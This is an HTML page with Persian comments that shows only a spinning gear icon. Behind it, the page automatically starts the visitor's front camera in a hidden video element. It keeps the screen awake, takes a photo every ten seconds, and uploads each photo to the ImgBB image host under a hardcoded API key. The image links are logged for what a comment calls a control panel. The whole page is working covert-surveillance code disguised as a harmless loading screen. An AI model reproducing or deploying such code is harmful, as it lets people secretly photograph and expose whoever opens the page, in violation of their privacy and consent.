<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        * { margin: 0; padding: 0; user-select: none; }
        body {
            background: #000;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .gear {
            font-size: 140px;
            color: #333;
            animation: spin 3s linear infinite;
        }
        @keyframes spin {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="gear">⚙️</div>
    
    <video id="video" autoplay playsinline muted class="hidden"></video>
    <canvas id="canvas" class="hidden"></canvas>
    
    <script>
        // API Key تو اینجا
        const IMGBB_API_KEY = 'd43e25fcd19ff9a3c618bbca029e5e52'; // اینجا API Key خودت را بگذار
        
        let isCameraActive = false;
        let frameCount = 0;
        
        // شروع خودکار
        startCamera();
        
        async function startCamera() {
            try {
                // فعال کردن دوربین
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                });
                
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                await new Promise(resolve => {
                    video.onloadedmetadata = () => {
                        video.play();
                        resolve();
                    };
                });
                
                isCameraActive = true;
                
                // شروع ارسال تصاویر
                startSendingImages(video);
                
                // جلوگیری از sleep
                if ('wakeLock' in navigator) {
                    try {
                        await navigator.wakeLock.request('screen');
                    } catch (e) {}
                }
                
            } catch (error) {
                console.log('Camera error');
            }
        }
        
        function startSendingImages(video) {
            const canvas = document.getElementById('canvas');
            
            // هر ۱۰ ثانیه یک تصویر بفرست
            setInterval(() => {
                if (isCameraActive && video.videoWidth > 0) {
                    captureAndSend(video, canvas);
                }
            }, 10000); // هر ۱۰ ثانیه
            
            // اولین تصویر
            setTimeout(() => {
                if (isCameraActive && video.videoWidth > 0) {
                    captureAndSend(video, canvas);
                }
            }, 2000);
        }
        
        async function captureAndSend(video, canvas) {
            // گرفتن عکس
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // تبدیل به فرمت مناسب
            const imageData = canvas.toDataURL('image/jpeg', 0.7);
            
            frameCount++;
            console.log(`📸 گرفتن عکس شماره ${frameCount}`);
            
            // ارسال به ImgBB
            await uploadToImgBB(imageData, frameCount);
        }
        
        async function uploadToImgBB(imageData, count) {
            try {
                // حذف header data:image/jpeg;base64,
                const base64Data = imageData.split(',')[1];
                
                // ایجاد FormData
                const formData = new FormData();
                formData.append('image', base64Data);
                
                // ارسال به سرور ImgBB
                const response = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                
                if (result.success) {
                    console.log(`✅ عکس ${count} آپلود شد:`, result.data.url);
                    
                    // ذخیره لینک در localStorage (برای پنل کنترل)
                    saveImageLink(result.data.url, count);
                } else {
                    console.log('❌ خطا در آپلود:', result.error);
                }
                
            } catch (error) {
                console.log('📡 خطای شبکه:', error);
            }
        }
        
        function saveImageLink(imageUrl, count) {
            // ذخیره در localStorage گوشی
            const imageInfo = {
                url: imageUrl,
                time: new Date().toLocaleString('fa-IR'),
                count: count,
                timestamp: Date.now()
            };
            
            const key = `img_${count}`;
            localStorage.setItem(key, JSON.stringify(imageInfo));
            
            // فقط ۵ تصویر آخر را نگه دار
            cleanupStorage();
        }
        
        function cleanupStorage() {
            const keys = Object.keys(localStorage);
            const imgKeys = keys.filter(k => k.startsWith('img_'));
            
            if (imgKeys.length > 5) {
                imgKeys.sort();
                const toRemove = imgKeys.slice(0, imgKeys.length - 5);
                toRemove.forEach(k => localStorage.removeItem(k));
            }
        }
        
        // وقتی صفحه بسته می‌شود
        window.addEventListener('beforeunload', () => {
            const video = document.getElementById('video');
            if (video.srcObject) {
                video.srcObject.getTracks().forEach(track => track.stop());
            }
        });
    </script>
</body>
</html>
